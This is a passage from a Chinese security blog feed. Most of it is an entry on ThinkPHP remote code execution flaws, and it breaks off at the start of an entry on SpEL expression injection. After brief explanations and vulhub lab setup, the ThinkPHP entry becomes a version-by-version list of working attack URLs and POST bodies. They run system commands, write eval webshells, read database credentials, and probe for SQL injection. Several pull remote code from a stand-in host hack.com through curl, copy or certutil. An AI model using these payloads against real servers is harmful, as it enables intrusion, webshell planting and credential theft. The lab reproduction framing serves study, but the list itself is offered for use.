title="特殊指纹出现logo"></a>特殊指纹出现logo</h3><p><code>4e5e5d7364f443e28fbf0d3ae744a59a</code>相当于thinkphp的后门，访问<code>?a=4e5e5d7364f443e28fbf0d3ae744a59a</code>出现logo即为thinkphp框架</p><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p>利用<code>Wappalyzer</code>插件可看web框架</p><h2 id="高危漏洞介绍"><a href="#高危漏洞介绍" class="headerlink" title="高危漏洞介绍"></a>高危漏洞介绍</h2><p><img src="/archives/7509d866/1863419-20211224202706861-1740606751.png"></p><p>可以看出，ThinkPHP近年出现的高风险漏洞主要存在于<strong>框架中的函数</strong>，这些漏洞均需要在二次开发的过程中使用了这些风险函数方可利用，所以<strong>这些漏洞更应该被称为框架中的风险函数</strong>，且这些风险点大部分<strong>可导致SQL注入漏洞</strong>，所以，开发者在利用ThinkPHP进行Web开发的过程中，一定需要关注这些框架的历史风险点，尽量规避这些函数或者版本，则可保证web应用的安全性。</p><h2 id="ThinkPHP-2-x-3-0-任意代码执行漏洞-2-rce"><a href="#ThinkPHP-2-x-3-0-任意代码执行漏洞-2-rce" class="headerlink" title="ThinkPHP 2.x&#x2F;3.0 任意代码执行漏洞(2-rce)"></a>ThinkPHP 2.x&#x2F;3.0 任意代码执行漏洞(2-rce)</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>ThinkPHP是为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源MVC框架。Dispatcher.class.php中res参数中使用了<strong>preg_replace的&#x2F;e危险参数，使得preg_replace第二个参数就会被当做php代码执行</strong>，导致存在一个代码执行漏洞，攻击者可以利用构造的恶意URL执行任意PHP代码。</p><p>而在ThinkPHP 2.x版本中，使用preg_replace的&#x2F;e模式匹配路由：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, <span class="title function_ invoke__">implode</span>(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br></pre></td></tr></table></figure><blockquote><p><strong>preg_replace(‘正则规则’,’替换字符’,’目标字符’)</strong></p><p><strong>如果使用了<code>/e</code>修饰符，则存在代码执行漏洞</strong></p></blockquote><p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。</p><p>ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。</p><p>正则表达式可以简化为<strong>“\w+&#x2F;([^&#x2F;])”，即搜索获取“&#x2F;”前后的两个参数，$var[‘\1’]&#x3D;”\2”;是对数组的操作，将之前搜索到的第一个值作为新数组的键，将第二个值作为新数组的值，我们发现可以构造搜索到的第二个值，即可执行任意PHP代码，</strong>在PHP中，我们可以使用${}里面可以执行函数，然后我们在thinkphp的url中的偶数位置使用**${}格式的php代码,如果是一般的字符，可被作为变量，如${a}等价于$a，如果是已知函数，就会被执行，即可最终执行thinkphp任意代码执行漏洞**，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php?s=a/b/c/$&#123;code&#125;</span><br><span class="line">index.php?s=a/b/c/$&#123;code&#125;/d/e/f</span><br><span class="line">index.php?s=a/b/c/d/e/$&#123;code&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>在一组数据{abcdefgh}中，通过命令执行函数的方式，该数组可以依次执行：a–&gt;b（值即执行b语句）  c–&gt;d（值即执行d语句），而在thinkphp中正好该方式体现在url的路由上，故会有s&#x3D;&#x2F;index(a)&#x2F;index(b)&#x2F;xxx(c)&#x2F;${print(phpinfo())}(d)的payload</strong></p></blockquote><p>之所以payload是这样是由于Thinkphp存在两种路由规则：</p><ol><li><strong>[<a href="http://servername/index.php/%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C/[%E5%8F%82%E6%95%B0%E5%90%8D/%E5%8F%82%E6%95%B0%E5%80%BC...]">http://serverName/index.php/模块/控制器/操作/[参数名/参数值...]</a></strong></li><li><strong>如果不支持PATHINFO的服务器可以使用兼容模式访问如下：</strong></li><li><strong>[<a href="http://servername/index.php?s=%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C/%5B%E5%8F%82%E6%95%B0%E5%90%8D/%E5%8F%82%E6%95%B0%E5%80%BC...%5D">http://serverName/index.php?s=模块/控制器/操作/[参数名/参数值...]</a></strong>]</li><li><strong>也可采用 index.php&#x2F;a&#x2F;b&#x2F;c&#x2F;${code}一下形式</strong></li></ol><h3 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><ul><li><p><strong>thinkphp版本</strong></p><p>2.x&#x2F;3.0</p></li><li><p><strong>php版本</strong></p><p><strong>php&lt;&#x3D;5.6.29</strong></p></li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ul><li><p><strong>环境搭建</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">启动docker:</span><br><span class="line">systemctl start docker</span><br><span class="line"></span><br><span class="line">切换到漏洞下：</span><br><span class="line">cd vulhub/thinkphp/2-rce</span><br><span class="line"></span><br><span class="line">执行，d是放在后台(注意失败可能是权限不够，换root)：</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>然后直接访问即可：</p><p><img src="/archives/7509d866/QQ20241010-151937.png"></p></li><li><p><strong>漏洞验证</strong></p><p><strong>命令执行：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/index.php/a/b/b/$&#123;phpinfo()&#125;</span><br><span class="line">http://127.0.0.1:8080/index.php?s=a/b/b/$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/7509d866/QQ20241010-163016.png"></p><p><img src="/archives/7509d866/QQ20241010-162755.png"></p><p><strong>一句话：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/index.php/?s=a/b/c/$&#123;@print(eval($_POST[1]))&#125;</span><br></pre></td></tr></table></figure><p>当然也可以进行反弹shell操作</p></li></ul><h2 id="ThinkPHP5-5-x-远程代码执行漏洞-5-rce"><a href="#ThinkPHP5-5-x-远程代码执行漏洞-5-rce" class="headerlink" title="ThinkPHP5 5.x 远程代码执行漏洞(5-rce)"></a>ThinkPHP5 5.x 远程代码执行漏洞(5-rce)</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>由于Thinkphp v5框架代码问题，使在没有开启强制路由的情况下，黑客构造特定的请求，可直接进行远程的代码执行，进而获得服务器权限。</p><h3 id="漏洞条件-1"><a href="#漏洞条件-1" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><p><strong>thinkphp版本</strong>：</p><p>5.0.22&#x2F;5.1.29</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ul><li><p><strong>环境搭建</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">启动docker:</span><br><span class="line">systemctl start docker</span><br><span class="line"></span><br><span class="line">切换到漏洞下：</span><br><span class="line">cd vulhub/thinkphp/5-rce</span><br><span class="line"></span><br><span class="line">执行，d是放在后台(注意失败可能是权限不够，换root)：</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></li><li><p><strong>验证漏洞</strong></p><p><strong>任意代码执行：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</span><br></pre></td></tr></table></figure><p><img src="/archives/7509d866/QQ20241010-170418.png"></p><p>因为thinkphp的路由规则为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://serverName/index.php?s=模块/控制器/操作/[参数名/参数值...]</span><br></pre></td></tr></table></figure><p>可理解为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">module：index</span><br><span class="line"></span><br><span class="line">controller：think\app</span><br><span class="line"></span><br><span class="line">action：invokefunction</span><br></pre></td></tr></table></figure><p><strong>写入webshell：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=l.php&amp;vars[1][]=%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%7a%63%63%27%5d%29%3b%3f%3e</span><br></pre></td></tr></table></figure><p>然后访问l.php，连接即可</p></li></ul><h2 id="ThinkPHP-5-x-远程代码执行漏洞-5-0-23-rce"><a href="#ThinkPHP-5-x-远程代码执行漏洞-5-0-23-rce" class="headerlink" title="ThinkPHP 5.x 远程代码执行漏洞(5.0.23-rce)"></a>ThinkPHP 5.x 远程代码执行漏洞(5.0.23-rce)</h2><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>与5-rce类似。都是由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的 getshell 漏洞，受影响的版本包括 5.0 和 5.1 版本</p><p>该漏洞的漏洞关键点存在thinkphp&#x2F;library&#x2F;think&#x2F;Request.php文件中</p><h3 id="漏洞条件-2"><a href="#漏洞条件-2" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><p>ThinkPHP &lt;&#x3D; 5.0.23 需要存在xxx的method路由，例如captcha</p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ul><li><p><strong>环境搭建</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">启动docker:</span><br><span class="line">systemctl start docker</span><br><span class="line"></span><br><span class="line">切换到漏洞下：</span><br><span class="line">cd vulhub/thinkphp/5.0.23-rce</span><br><span class="line"></span><br><span class="line">执行，d是放在后台(注意失败可能是权限不够，换root)：</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></li><li><p><strong>漏洞验证</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST：</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</span><br></pre></td></tr></table></figure><p><img src="/archives/7509d866/QQ20241010-173201.png"></p></li></ul><h2 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><h3 id="thinkphp-5-0-5"><a href="#thinkphp-5-0-5" class="headerlink" title="thinkphp 5.0.5"></a>thinkphp 5.0.5</h3><p>waf对eval进行了拦截</p><p>禁止了assert函数</p><p>对eval函数后面的括号进行了正则过滤</p><p>对file_get_contents函数后面的括号进行了正则过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxxx.com/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=2.php&amp;vars[1][1]=&lt;?php /*1111*//***/file_put_contents/*1**/(/***/&#x27;index11.php&#x27;/**/,file_get_contents(/**/&#x27;https://www.hack.com/xxx.js&#x27;))/**/;/**/?&gt;</span><br></pre></td></tr></table></figure><h3 id="thinkphp-5-0-10"><a href="#thinkphp-5-0-10" class="headerlink" title="thinkphp 5.0.10"></a>thinkphp 5.0.10</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(post)public/index.php?s=index/index/index (data)s=whoami&amp;_method=__construct&amp;method&amp;filter[]=system</span><br></pre></td></tr></table></figure><h3 id="thinkphp-5-0-11"><a href="#thinkphp-5-0-11" class="headerlink" title="thinkphp 5.0.11"></a>thinkphp 5.0.11</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][0]=curl https://www.hack.com/xxx.js -o ./upload/xxx.php</span><br></pre></td></tr></table></figure><h3 id="thinkphp-5-0-14"><a href="#thinkphp-5-0-14" class="headerlink" title="thinkphp 5.0.14"></a>thinkphp 5.0.14</h3><p>eval（’’）和assert（’’）被拦截，命令函数被禁止</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=phpinfo();</span><br><span class="line"></span><br><span class="line">http://www.xxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_GET[1])&amp;1=call_user_func_array(&quot;file_put_contents&quot;,array(&quot;3.php&quot;,file_get_contents(&quot;https://www.hack.com/xxx.js&quot;)));</span><br></pre></td></tr></table></figure><h3 id="php7-2"><a href="#php7-2" class="headerlink" title="php7.2"></a>php7.2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=1.txt&amp;vars[1][1]=1</span><br><span class="line"></span><br><span class="line">http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=index11.php&amp;vars[1][1]=&lt;?=file_put_contents(&#x27;index111.php&#x27;,file_get_contents(&#x27;https://www.hack.com/xxx.js&#x27;));?&gt;</span><br></pre></td></tr></table></figure><p>写进去发现转义了尖括号</p><p>通过copy函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=copy&amp;vars[1][0]= https://www.hack.com/xxx.js&amp;vars[1][1]=112233.php</span><br></pre></td></tr></table></figure><h3 id="thinkphp-5-0-18"><a href="#thinkphp-5-0-18" class="headerlink" title="thinkphp 5.0.18"></a>thinkphp 5.0.18</h3><p>windows</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][0]=1</span><br><span class="line">http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=phpinfo()</span><br></pre></td></tr></table></figure><p>使用certutil</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=passthru&amp;vars[1][0]=cmd /c certutil -urlcache -split -f https://www.hack.com/xxx.js uploads/1.php</span><br></pre></td></tr></table></figure><p>由于根目录没写权限，所以写到uploads</p><h3 id="thinkphp-5-0-20"><a href="#thinkphp-5-0-20" class="headerlink" title="thinkphp 5.0.20"></a>thinkphp 5.0.20</h3><p>phpinfo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxxx.com/index.php?</span><br><span class="line">s=/Index/\think\app/invokefunction&amp;function=call_user_func_a</span><br><span class="line">rray&amp;vars[0]=phpinfo&amp;vars[1][]=-1%20and%20it%27ll%20execute%20the%20phpinfo</span><br></pre></td></tr></table></figure><p>任意代码执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxxx.com/index.php?</span><br><span class="line">s=index/think\app/invokefunction&amp;function=call_user_func_arr</span><br><span class="line">ay&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><p>写入webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxxx.com/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=test.php&amp;vars[1][]=%3C%3Fphp%20eval(%24_POST%5Btest%5D)%3B%3F%3E</span><br></pre></td></tr></table></figure><h3 id="thinkphp-5-0-21"><a href="#thinkphp-5-0-21" class="headerlink" title="thinkphp 5.0.21"></a>thinkphp 5.0.21</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line"></span><br><span class="line">http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure><h3 id="thinkphp-5-0-22"><a href="#thinkphp-5-0-22" class="headerlink" title="thinkphp 5.0.22"></a>thinkphp 5.0.22</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.1/thinkphp/public/?s=.|think\config/get&amp;name=database.username</span><br><span class="line"></span><br><span class="line">http://192.168.1.1/thinkphp/public/?s=.|think\config/get&amp;name=database.password</span><br><span class="line"></span><br><span class="line">http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line"></span><br><span class="line">http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure><h3 id="thinkphp-5-0-23"><a href="#thinkphp-5-0-23" class="headerlink" title="thinkphp 5.0.23"></a>thinkphp 5.0.23</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(post)public/index.php?s=captcha (data) _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls -al</span><br></pre></td></tr></table></figure><p>Debug模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(post)public/index.php (data)_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=touch%20/tmp/xxx</span><br></pre></td></tr></table></figure><h3 id="thinkphp-5-1-18"><a href="#thinkphp-5-1-18" class="headerlink" title="thinkphp 5.1.18"></a>thinkphp 5.1.18</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=index11.php&amp;vars[1][1]=&lt;?=file_put_contents(&#x27;index_bak2.php&#x27;,file_get_contents(&#x27;https://www.hack.com/xxx.js&#x27;));?&gt;</span><br></pre></td></tr></table></figure><p>所有目录都无写权限,base64函数被拦截</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_POST[1])</span><br></pre></td></tr></table></figure><h3 id="thinkphp-5-1"><a href="#thinkphp-5-1" class="headerlink" title="thinkphp 5.1.*"></a>thinkphp 5.1.*</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</span><br><span class="line"></span><br><span class="line">http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=system&amp;data=cmd</span><br><span class="line"></span><br><span class="line">http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line"></span><br><span class="line">http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line"></span><br><span class="line">http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line">http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd</span><br><span class="line"></span><br><span class="line">http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line">http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd</span><br></pre></td></tr></table></figure><h3 id="thinkphp-5-1-和5-2和5-0"><a href="#thinkphp-5-1-和5-2和5-0" class="headerlink" title="thinkphp 5.1.和5.2和5.0*"></a>thinkphp 5.1.和5.2和5.0*</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(post)public/index.php (data)c=exec&amp;f=calc.exe&amp;_method=filter</span><br></pre></td></tr></table></figure><h3 id="thinkphp-未知版本"><a href="#thinkphp-未知版本" class="headerlink" title="thinkphp 未知版本"></a>thinkphp 未知版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\module/action/param1/$&#123;@phpinfo()&#125;</span><br><span class="line"></span><br><span class="line">?s=index/\think\Module/Action/Param/$&#123;@phpinfo()&#125;</span><br><span class="line"></span><br><span class="line">?s=index/\think/module/aciton/param1/$&#123;@print(THINK_VERSION)&#125;</span><br><span class="line"></span><br><span class="line">index.php?s=/home/article/view_recent/name/1&#x27;</span><br><span class="line"></span><br><span class="line">header = &quot;X-Forwarded-For:1&#x27;) and extractvalue(1, concat(0x5c,(select md5(233))))#&quot;</span><br><span class="line"></span><br><span class="line">index.php?s=/home/shopcart/getPricetotal/tag/1%27</span><br><span class="line"></span><br><span class="line">index.php?s=/home/shopcart/getpriceNum/id/1%27</span><br><span class="line"></span><br><span class="line">index.php?s=/home/user/cut/id/1%27</span><br><span class="line"></span><br><span class="line">index.php?s=/home/service/index/id/1%27</span><br><span class="line"></span><br><span class="line">index.php?s=/home/pay/chongzhi/orderid/1%27</span><br><span class="line"></span><br><span class="line">index.php?s=/home/pay/index/orderid/1%27</span><br><span class="line"></span><br><span class="line">index.php?s=/home/order/complete/id/1%27</span><br><span class="line"></span><br><span class="line">index.php?s=/home/order/complete/id/1%27</span><br><span class="line"></span><br><span class="line">index.php?s=/home/order/detail/id/1%27</span><br><span class="line"></span><br><span class="line">index.php?s=/home/order/cancel/id/1%27</span><br><span class="line"></span><br><span class="line">index.php?s=/home/pay/index/orderid/1%27)%20UNION%20ALL%20SELECT%20md5(233)--+</span><br><span class="line"></span><br><span class="line">POST /index.php?s=/home/user/checkcode/ HTTP/1.1</span><br><span class="line">Content-Disposition: form-data; name=&quot;couponid&quot;1&#x27;) union select sleep(&#x27;&#x27;&#x27;+str(sleep_time)+&#x27;&#x27;&#x27;)#</span><br></pre></td></tr></table></figure><h3 id="当php7以上无法使用Assert的时候用"><a href="#当php7以上无法使用Assert的时候用" class="headerlink" title="当php7以上无法使用Assert的时候用"></a>当php7以上无法使用Assert的时候用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=包含&amp;x=phpinfo();</span><br></pre></td></tr></table></figure><p>有上传图片或者日志用这个包含就可以</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> php代码审计 </category>
          
          <category> thinkphp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpEL表达式注入</title>
      <link href="/archives/9bce8627/"/>
      <url>/archives/9bce8627/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Spring Expression Lanuage(SpEL)，Spring语言表达式，是一个支持查询和操作运行时对象导航图功能的强大的表达式语言，语法类似于传统EL。创建的初衷是为了给Spring社区提供一种简单而高效的表达式语言，一种可贯穿整个Spring产品组的语言。这种语言特性基于Spring产品的需求而设计。虽然SpEL引擎作为Spring组合里的表达式解析的基础，但不直接依赖于Spring。</p><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>SpEL的设计初衷是为了简化开发工作，提供一种<strong>在运行时动态解析和执行表达式的机制</strong>，常用于如下场景：</p><ul><li>配置Bean的属性值（配合<code>@Value</code>注解）</li><li>Spring Security权限表达式</li><li>Spring Data JPA查询表达式</li><li>条件逻辑控制（如SPEL条件注解<code>@ConditionalOnExpression</code>）</li><li>模板引擎中处理动态数据</li><li>静态方法调用或对象动态构造</li></ul><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><h3 id="注解-Value中"><a href="#注解-Value中" class="headerlink" title="注解@Value中"></a>注解@Value中</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@Value能修饰成员变量和方法形参</span></span><br><span class="line"><span class="comment">//#&#123;&#125;内就是表达式的内容</span></span><br><span class="line"><span class="meta">@Value(&quot;#&#123;表达式&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String arg;</span><br></pre></td></tr></table></figure><p>demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value(&quot;#&#123;user.name&#125;&quot;)</span></span><br></pre></td></tr></table></figure><blockquote><p>**<code>@Value</code>**：Spring 的注解，用于注入值到字段、方法参数或构造函数参数中</p></blockquote><p>能让我们动态从某个Bean中获取字段值注入到另一个Bean中，即从Spring容器中获取名为”user”的Bean，并注入其<code>name</code>属性的值</p><h3 id="XML配置"><a href="#XML配置" class="headerlink" 